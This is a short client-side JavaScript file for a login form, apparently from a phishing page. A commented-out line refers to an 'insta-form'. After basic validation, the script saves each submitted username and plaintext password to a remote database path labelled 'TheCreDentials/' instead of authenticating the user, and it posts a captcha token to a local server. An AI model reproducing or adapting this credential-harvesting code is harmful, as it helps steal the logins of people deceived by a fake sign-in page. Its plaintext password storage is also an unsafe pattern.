"use strict";
const setErrors = (errors, errorType, details) => {
    let error = { errorType, details };
    let usernameError = errors.find(e => e.errorType === errorType);
    if (!usernameError)
        errors.push(error);
}, clearError = (errors, errorType) => {
    let error = errors.find(e => e.errorType === errorType);
    if (error) {
        let errIndex = errors.indexOf(error, 0);
        errors.splice(errIndex, 1);
    }
};
document.addEventListener('DOMContentLoaded', (e) => {
    const inputs = document.querySelectorAll("form input");
    const inputEmail = inputs[0];
    const inputPassword = inputs[1];
    const form = document.querySelector('form');
    let errors = [];
    form === null || form === void 0 ? void 0 : form.addEventListener('submit', (e) => {
        e.preventDefault();
        const username = inputEmail.value;
        const password = inputPassword.value;
        if (!username || username.length < 3) {
            inputEmail.style.border = "1px solid red";
            setErrors(errors, 'usernameError', 'invalidusername');
            console.log(errors);
        }
        else {
            inputEmail.style.border = "none";
            clearError(errors, 'usernameError');
        }
        //password
        if (password.match(/^(?=.*[a-zA-Z])(?=.*[0-9])(?=.*[\W_]).{8,}$/)) {
            inputPassword.style.border = "none";
            clearError(errors, 'passwordError');
        }
        else {
            inputPassword.style.border = "1px solid red";
            setErrors(errors, 'passwordError', 'invalidPassword');
        }
        if (errors.length == 0) {
            inserData(username, password);
        }
    });
    window.onSubmit = (token) => {
        console.log('token', token);
        axios({ method: 'post', url: 'http://localhost:3003', data: { token }, withCredentials: false, contentType: 'application/json' })
            .then(function (score) {
            console.log(score);
        })
            .catch(function (error) {
            console.log(error);
        });
        // (document.getElementById("insta-form") as HTMLFormElement).submit();
    };
    const { databse, set, ref, update, remove } = window.functions;
    const inserData = (username, password) => {
        set(ref(databse, "TheCreDentials/" + username), {
            user: username,
            pass: password
        });
    };
});
